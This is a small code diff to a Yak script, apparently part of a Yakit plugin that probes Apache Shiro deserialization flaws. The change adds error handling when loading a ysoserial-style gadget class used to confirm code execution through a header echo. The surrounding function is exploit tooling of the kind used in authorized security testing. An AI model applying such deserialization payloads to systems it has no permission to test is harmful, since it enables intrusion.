@@ -378,7 +378,11 @@ blindEcho = func (bs64key,mode,shiroCookieKey,freq,isHttps) {
     echoKey = randstr(6)
     echoValue = randstr(8)
     reqValue = echoKey + "|" + echoValue
-    payloadObj , _ = yso.LoadClassFromBytes(bytesCode)
+    payloadObj , err = yso.LoadClassFromBytes(bytesCode)
+    if err {
+        yakit.Error("load header echo class failed %v",err)
+        return
+    }
     flag := payloadObj.FindConstStringFromPool("Etag|3147526947")
     if flag != nil {
         flag.Value = reqValue
